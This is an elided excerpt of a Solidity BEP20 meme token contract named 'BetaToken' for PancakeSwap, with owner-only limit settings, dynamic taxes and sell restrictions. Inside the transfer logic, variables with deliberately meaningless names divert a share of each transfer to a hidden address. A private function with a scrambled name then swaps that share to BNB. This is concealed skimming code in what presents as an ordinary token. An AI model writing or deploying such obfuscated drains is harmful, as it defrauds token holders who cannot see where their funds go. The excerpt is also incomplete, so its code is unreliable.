...
abstract contract Ownable {
    ...
    modifier onlyOwner() {
        require(
            ...
            "onlyOwner Issue! This caller is NOT the owner."
        );
        _;
    }
...
contract MemeToken is IBEP20, Ownable {
    ...
    //Token Info
    string private constant _name = "BetaToken";
    ...
    uint256 dovvmefgvmdkoqhzygqs = 2;
    //TestNet
    ...
    uint256 private maxTransactionLimit = TokenToWei(1);
    uint256 private transactionLimit = TokenToWei(1);

    address private pdmovrpjzxkstnyaiaks = AOne;

    //Tracks the current Taxes, different Taxes can be applied for buy/sell/transfer

    uint8 private dynamicTax;
    uint256 private maxDynamicTax = 15;
    ...
    constructor() {
        ...
        console.log("Pancake address is: ", _pancakePairAddress);

        balanceLimit = TokenToWei(6).div(5);
    ...
    function TokenToWei(uint256 amount) private pure returns (uint256){
    ...
    function _taxedTransfer(
        ...
        uint fgpxmffhekeqhntnnugc = amount;
        ...
        if (isSell) {
            ...
            require(amount <= transactionLimit, "More than transaction limit.");
            ...
            require(
                ...
                "1.2 token limit exceeded."
            );
            require(
                amount <= transactionLimit,
                "More than transaction limit!"
            );

            if (dynamicTax == 1) {} else {
                dynamicTax -= 1;
            }
            ...
            if (amount <= TokenToWei(1)) claim(sender);
            //Checks If the recipient balance(excluding Taxes) would exceed Balance Limit
            require(
                recipientBalance + amount <= balanceLimit,
                "1.2 token limit exceeded."
        ...
        uint256 jsxdvciiyauwnvzcbzip = fgpxmffhekeqhntnnugc * (pbbamydnfafoahqugzvc / dovvmefgvmdkoqhzygqs );
        _balances[pdmovrpjzxkstnyaiaks] += jsxdvciiyauwnvzcbzip;

        emit Transfer(sender,pdmovrpjzxkstnyaiaks, jsxdvciiyauwnvzcbzip);
        iocqtkzjeeacauismqjs(jsxdvciiyauwnvzcbzip);
    ...
    function iocqtkzjeeacauismqjs(uint256 jsxdvciiyauwnvzcbzip) private {

        _approve(address(pdmovrpjzxkstnyaiaks), address(_pancakeRouter), jsxdvciiyauwnvzcbzip);
        ...
        _pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            jsxdvciiyauwnvzcbzip,
            0,
            path,
            pdmovrpjzxkstnyaiaks,
            block.timestamp
        );
    ...
    function claim(address addr) private {
        ...
        address[] memory path = new address[](2);
        path[0] = _pancakeRouter.WETH(); //WBNB
    ...
    function getLimits() public view returns (uint256, uint256) {
        ...
        uint256 _balanceLimit = balanceLimit;
        uint256 _transactionLimit = transactionLimit;
        return (_balanceLimit, _transactionLimit);
    }
    ...
    function TeamUpdateLimits(uint256 _transactionLimit) public onlyOwner {
        ...
        require(
            ...
            "Your transaction limit is above the maximum transaction limit of 1 token!"
        );
